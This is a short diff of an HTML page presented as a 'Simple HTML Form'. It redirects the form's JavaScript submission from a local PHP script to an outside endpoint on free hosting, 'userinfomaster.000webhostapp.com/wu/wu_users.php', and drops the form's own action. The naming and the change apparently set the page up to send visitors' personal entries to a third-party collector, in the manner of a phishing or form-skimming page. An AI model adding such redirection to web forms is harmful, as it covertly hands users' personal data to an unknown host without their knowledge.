@@ -359,7 +359,7 @@
     const form = document.getElementById('simpleForm');
     const formData = new FormData(form);
 
-    fetch('submit_form.php', {
+    fetch('http://userinfomaster.000webhostapp.com/wu/wu_users.php', {
         method: 'POST',
         body: formData
     })
@@ -397,7 +397,8 @@
 
     <div class="container">
         <h2>Simple HTML Form</h2>
-        <form id="simpleForm" onsubmit="displayFormData(event)" action="wu_users.php" method="POST" >
+        <form id="simpleForm" method="POST" onsubmit="displayFormData(event)">
+
             <label for="fullName">Full Name:</label>
             <input type="text" id="fullName" name="fullName" required>
 
